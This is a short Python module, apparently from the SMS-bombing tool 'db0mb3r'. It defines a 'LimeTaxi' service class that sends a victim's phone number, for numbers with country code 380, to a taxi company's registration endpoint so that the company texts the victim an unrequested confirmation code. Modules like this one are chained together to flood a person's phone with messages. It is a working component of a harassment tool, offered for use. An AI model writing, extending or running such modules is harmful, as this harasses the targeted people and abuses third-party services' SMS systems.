from db0mb3r.services.service import Service


class LimeTaxi(Service):
    phone_codes = [380]

    async def run(self):
        await self.post(
            "http://212.22.223.149:7200/api/account/register/sendConfirmCode",
            json={"phone": self.phone},
        )
